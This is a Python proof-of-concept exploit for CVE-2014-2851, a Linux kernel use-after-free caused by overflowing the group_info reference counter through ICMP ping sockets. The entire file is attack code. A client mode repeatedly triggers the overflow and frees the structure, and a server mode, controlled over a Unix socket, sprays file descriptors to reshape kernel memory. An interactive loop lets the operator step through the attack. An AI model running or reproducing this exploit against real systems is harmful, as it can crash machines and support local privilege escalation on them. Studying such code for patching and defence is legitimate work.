#!/usr/bin/python
#
# Exploiting CVE-2014-2851: Linux group_info refcounter overflow use afer free
# 
# http://thomaspollet.blogspot.be/ - @Tohmaxx 
#

import sys, os, ctypes, time
from socket import *
from optparse import OptionParser

libc = ctypes.CDLL("libc.so.6")

SOCK_PATH = "/tmp/xsock"
FD_COUNT  = 1000

R_OK = 4 
AT_EACCESS = 512
 
def open_fds( close = False):
    fds = []
    print "opening %i fds "%FD_COUNT
    for i in range(FD_COUNT):
        try:
            fname = "/tmp/tmpf%i"%i
            fds += [os.open(fname,os.O_CREAT|os.O_RDWR|os.O_NONBLOCK|os.O_LARGEFILE)]
        except:
            print "failed to open fd %s"%fname
            break
    
    if close:
        for fd in fds: os.close(fd)
    
    return fds
                
                        
def server():
    if os.path.exists( SOCK_PATH ):
        os.remove(SOCK_PATH)
    srv = socket( AF_UNIX, SOCK_STREAM )
    srv.bind(SOCK_PATH)
    srv.listen(1)
    conn, addr = srv.accept()
    while True:
        data = conn.recv( 1024 )
        if data[0] == "o":
            if os.fork() == 0:
                open_fds(True)
            else:
                os.wait()
        elif data[0] == "h":
            open_fds()
        elif data[0] == "x":
            break
        conn.send(data)
    print "Closing server"
    try:
        os.remove(SOCK_PATH)
        conn.close()    
    except:
        print "failed to close server"
        pass
        
######## Client
def do_ping():
    try:
        socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP)
    except:
        pass

def free():
    '''
        call faccessat to increment and decrement the groupinfo usage counter
        if the counter has overflown and became 0, the chunk will be freed 
    '''
    libc.faccessat(0, "/",  R_OK, AT_EACCESS);

def get_groups():
    return libc.getgroups(0,0)    

def send(client,cmd):
    client.send(cmd)
    client.recv(1)
                    
    
def client(skip = 0):

    ng = get_groups()
    
    client = socket( AF_UNIX, SOCK_STREAM )
    client.connect( SOCK_PATH )
    
    for i in range(skip):
        do_ping()
        
    while ng == get_groups():
        do_ping()
        free()
        send(client,'o')
        time.sleep(15)
        print "numgroups: %i" % get_groups()
      
    while True:
        try:
            cmd = raw_input( "> " )
            for x in cmd:
                if x == "p" :
                    do_ping()
                if x == "f":
                    free()
                if x == "n":
                    print get_groups()
                else:
                    send(client,x)    
        except KeyboardInterrupt, k:
            print "Shutting down."
            break
            
    client.close()


import argparse
parser = argparse.ArgumentParser(description='ping_init_sock() exploit')
parser.add_argument('-c', action='store_true', dest='client',help='client (exploit) mode')
parser.add_argument('-s', action='store_true', dest='server',help='server (control) mode')

args = parser.parse_args()

if __name__ == '__main__':
    if args.client:
        #os.spawnlp(os.P_NOWAIT, sys.argv[0], "pingserver", "dummy")
        print "Starting client"
        while not os.path.exists(SOCK_PATH):
            print "Waiting for control connection (%s)" % SOCK_PATH
            time.sleep(1)
        client(14)
    if args.server:
        print "Starting Server"
        server()

sys.exit(0)

from ctypes import *
a = create_string_buffer (40)
libc = CDLL("libc.so.6")
libc.getgroups(10,a)


